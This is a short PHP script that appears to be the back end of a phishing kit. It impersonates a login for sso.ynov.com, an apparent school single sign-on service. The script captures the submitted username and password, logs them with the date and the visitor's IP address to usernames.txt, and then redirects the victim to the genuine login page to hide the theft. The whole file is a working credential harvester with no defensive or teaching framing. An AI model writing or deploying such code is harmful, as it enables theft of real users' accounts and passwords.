<?php
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$date = strftime("%d-%m-%Y %H:%M:%S");
$handle = fopen("usernames.txt", "a");
fwrite($handle, 'date='.$date."\r\n");
fwrite($handle,'user='.$_POST['username']."\r\n");
fwrite($handle,'pass='.$_POST['password']."\r\n");
fwrite($handle,'ip='.getUserIpAddr()."\r\n");
fwrite($handle, "\r\n");
fclose($handle);
header ('Location: https://sso.ynov.com/login');
?>
